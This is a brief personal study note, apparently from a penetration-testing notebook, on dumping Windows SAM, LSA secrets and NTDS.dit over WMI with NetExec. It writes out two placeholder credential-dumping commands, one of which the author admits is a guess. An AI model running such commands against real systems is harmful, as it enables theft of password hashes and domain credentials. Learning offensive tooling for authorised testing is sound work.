Alternative to SMB

dumping SAM, LSA, and NTDS.dit can be done with the "ntds_dump_raw" module
- often caught by AV
`poetry run nxc wmi <IP> -u <user> -p <pass> --sam --lsa`
`poetry run nxc wmi <IP> -u <user> -p <pass> -M ntds_dump_raw`
- he didn't give the command for "ntds_dump_raw", but I assume it's this
![](assets/Pasted%20image%2020260724112144.png)
